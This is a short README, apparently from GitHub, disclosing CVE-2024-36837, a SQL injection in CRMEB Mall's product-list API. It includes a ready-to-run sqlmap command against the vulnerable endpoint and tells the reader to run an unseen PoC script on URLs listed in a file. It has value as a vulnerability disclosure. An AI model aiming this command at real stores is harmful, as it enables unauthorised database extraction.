# CVE-2024-36837 POC  
write URL in url.txt and run CVE-2024-36837.py  
![poc](https://github.com/phtcloud-dev/CVE-2024-36837/assets/151622760/fd8aa4de-9972-4be8-bda4-d0917f6ff686)

# CVE-2024-36837
In my freshman year, I found that an educational institution used CRMEB Mall as an online store in an Internet protection action. After testing, sql injection vulnerability was found. After setting up a local environment, the vulnerability was found in CRMEB version of CRMEB-KY v5.2.2 even higher  
  
Sqlmap: python sqlmap.py -u “http://XXX.URL/api/products?limit=20&priceOrder=&salesOrder=&selectId=0”  
Vulnerability code area  
File: website directory/app/API/controller/PC/ProductController. PHP  
![image](https://github.com/phtcloud-dev/CVE-2024-36837/assets/151622760/1a82c419-a200-4d8c-b5fb-1ee7bf4cbf58)  
In the getProductList function, passing arguments that are not validated or processed can easily result in the execution of malicious sql commands  
Suggested fixes:  
Using a web firewall  
Conduct regular security audits and vulnerability assessments to identify and mitigate potential security issues.  
Vendor URL: https://crmeb.com/  
Project making warehouse URL: https://github.com/crmeb/CRMEB/tree/master  
Vendor Information:  
Xi 'an Zhongbang network Technology Co., LTD  
西安众邦网络科技有限公司  
![image](https://github.com/phtcloud-dev/CVE-2024-36837/assets/151622760/ceb719e0-0d80-4d49-b9b9-d7d29ba3fb87)  
